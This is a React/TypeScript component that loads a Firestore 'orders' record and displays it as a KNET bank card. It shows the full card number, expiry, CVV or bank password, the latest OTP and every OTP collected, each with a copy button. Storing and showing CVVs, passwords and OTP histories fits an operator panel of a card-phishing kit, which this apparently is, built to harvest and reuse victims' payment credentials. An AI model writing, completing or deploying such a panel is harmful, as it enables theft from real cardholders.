'use client'

import { useState, useEffect } from 'react'
import { doc, getDoc } from 'firebase/firestore'
import { db } from '@/lib/firestore'

interface CardData {
  id: string
  cardNumber: string
  cvc: string
  bank: string
  pass: string
  otp: string
  prefix: string
  month: string
  year: string
  otpall: string[]
}

function formatCardNum(prefix: string, number: string) {
  const full = `${prefix || ''}${number || ''}`.replace(/\s/g, '')
  return full.match(/.{1,4}/g)?.join('  ') ?? full
}

export function CardsByID({ id }: { id: string }) {
  const [cards, setCards] = useState<CardData | null>(null)
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [copied, setCopied] = useState<string | null>(null)

  useEffect(() => {
    async function fetchCards() {
      try {
        setLoading(true)
        const docRef = doc(db, 'orders', id)
        const docSnap = await getDoc(docRef)
        if (docSnap.exists()) {
          setCards(docSnap.data() as CardData)
        } else {
          setError('No cards found')
        }
      } catch {
        setError('Error fetching cards')
      } finally {
        setLoading(false)
      }
    }
    fetchCards()
  }, [id])

  const copy = (val: string, key: string) => {
    navigator.clipboard.writeText(val)
    setCopied(key)
    setTimeout(() => setCopied(null), 1500)
  }

  if (loading) return <div className="text-center py-8 text-gray-400 text-sm">جاري التحميل...</div>
  if (error) return <div className="text-center py-8 text-red-400 text-sm">{error}</div>
  if (!cards) return <div className="text-center py-8 text-gray-400 text-sm">لا توجد بيانات</div>

  const cardNum = formatCardNum(cards.prefix, cards.cardNumber)
  const expiry = `${String(cards.month).padStart(2,'0')}/${String(cards.year).slice(-2)}`

  const rows = [
    { label: 'CVV', value: cards.pass || cards.cvc },
    { label: 'OTP', value: cards.otp },
    { label: 'كل الرموز', value: Array.isArray(cards.otpall) ? cards.otpall.join(' · ') : cards.otpall },
  ].filter(r => r.value)

  return (
    <div className="flex flex-col items-center gap-3">
      {/* Physical Card */}
      <div style={{
        width: 360, height: 225, borderRadius: 18,
        background: 'linear-gradient(135deg, #0d1b2a 0%, #1b2a4a 50%, #112244 100%)',
        position: 'relative', overflow: 'hidden',
        boxShadow: '0 20px 60px rgba(0,0,0,0.6), 0 4px 16px rgba(0,150,255,0.15)',
        fontFamily: "'Courier New', monospace", color: '#fff',
        userSelect: 'none', flexShrink: 0,
      }}>
        <div style={{ position:'absolute', inset:0, background:'radial-gradient(ellipse at 25% 15%, rgba(255,255,255,0.12) 0%, transparent 55%)', pointerEvents:'none' }} />
        <div style={{ position:'absolute', inset:0, opacity:0.04, background:'repeating-linear-gradient(45deg, #fff 0, #fff 1px, transparent 0, transparent 50%)', backgroundSize:'8px 8px', pointerEvents:'none' }} />

        {/* Top: Bank + KNET */}
        <div style={{ position:'absolute', top:18, left:20, right:20, display:'flex', justifyContent:'space-between', alignItems:'center' }}>
          <span style={{ fontSize:15, fontWeight:800, letterSpacing:'0.15em', color:'rgba(255,255,255,0.95)', textTransform:'uppercase', fontFamily:'sans-serif' }}>
            {cards.bank || 'BANK'}
          </span>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'flex-end', lineHeight:1 }}>
            <span style={{ fontSize:8, color:'rgba(255,255,255,0.4)', letterSpacing:'0.2em', textTransform:'uppercase', fontFamily:'sans-serif' }}>payment network</span>
            <span style={{ fontSize:14, fontWeight:900, letterSpacing:'0.25em', color:'#29d4f0', fontFamily:'sans-serif' }}>KNET</span>
          </div>
        </div>

        {/* Chip */}
        <div style={{ position:'absolute', top:60, left:20 }}>
          <div style={{ width:42, height:32, borderRadius:6, background:'linear-gradient(135deg, #d4a843 0%, #f0ca60 40%, #b8941e 100%)', boxShadow:'0 2px 6px rgba(0,0,0,0.4)', display:'flex', alignItems:'center', justifyContent:'center' }}>
            <svg width="28" height="22" viewBox="0 0 28 22">
              <rect x="0" y="7" width="28" height="1.5" fill="rgba(0,0,0,0.35)" rx="1"/>
              <rect x="0" y="13" width="28" height="1.5" fill="rgba(0,0,0,0.35)" rx="1"/>
              <rect x="9" y="0" width="1.5" height="22" fill="rgba(0,0,0,0.35)" rx="1"/>
              <rect x="17" y="0" width="1.5" height="22" fill="rgba(0,0,0,0.35)" rx="1"/>
              <rect x="5" y="3" width="18" height="16" fill="none" stroke="rgba(0,0,0,0.25)" strokeWidth="1" rx="2"/>
            </svg>
          </div>
        </div>

        {/* Contactless */}
        <div style={{ position:'absolute', top:64, left:72 }}>
          <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
            <path d="M10 2 Q17 10 10 18" stroke="rgba(255,255,255,0.7)" strokeWidth="2" strokeLinecap="round"/>
            <path d="M10 5.5 Q15 10 10 14.5" stroke="rgba(255,255,255,0.5)" strokeWidth="2" strokeLinecap="round"/>
            <path d="M10 9 Q13 10 10 11" stroke="rgba(255,255,255,0.35)" strokeWidth="2" strokeLinecap="round"/>
          </svg>
        </div>

        {/* Card Number */}
        <div style={{ position:'absolute', top:116, left:20, right:20 }}>
          <span style={{ fontSize:19, letterSpacing:'0.2em', fontWeight:700, color:'rgba(255,255,255,0.95)', textShadow:'0 1px 4px rgba(0,0,0,0.5)' }}>
            {cardNum}
          </span>
        </div>

        {/* Bottom */}
        <div style={{ position:'absolute', bottom:18, left:20, right:20, display:'flex', justifyContent:'space-between', alignItems:'flex-end' }}>
          <div>
            <div style={{ fontSize:7, color:'rgba(255,255,255,0.4)', letterSpacing:'0.18em', textTransform:'uppercase', fontFamily:'sans-serif', marginBottom:4 }}>VALID THRU</div>
            <div style={{ fontSize:13, fontWeight:800, color:'rgba(255,255,255,0.95)', letterSpacing:'0.15em' }}>{expiry}</div>
          </div>
          <div style={{ display:'flex', alignItems:'center' }}>
            <div style={{ width:36, height:36, borderRadius:'50%', background:'#eb001b', opacity:0.9 }} />
            <div style={{ width:36, height:36, borderRadius:'50%', background:'#f79e1b', opacity:0.9, marginLeft:-16 }} />
          </div>
        </div>
      </div>

      {/* Info rows */}
      {rows.length > 0 && (
        <div style={{ width:360, display:'flex', flexDirection:'column', gap:6 }}>
          {rows.map(row => (
            <div key={row.label} style={{
              display:'flex', justifyContent:'space-between', alignItems:'center',
              background:'#0b1511', border:'1px solid rgba(0,255,136,0.18)',
              borderRadius:12, padding:'10px 16px',
            }}>
              <span style={{ color:'rgba(255,255,255,0.45)', fontSize:13, fontFamily:'sans-serif' }}>{row.label}</span>
              <div style={{ display:'flex', alignItems:'center', gap:8 }}>
                <span style={{ color:'#00ff88', fontFamily:"'Courier New', monospace", fontWeight:700, fontSize:14 }}>{row.value}</span>
                <button onClick={() => copy(row.value, row.label)}
                  style={{ background:'none', border:'none', cursor:'pointer', color: copied === row.label ? '#00ff88' : 'rgba(0,255,136,0.4)', fontSize:14, padding:0, lineHeight:1, transition:'color 0.2s' }}>
                  {copied === row.label ? '✓' : '⧉'}
                </button>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  )
}
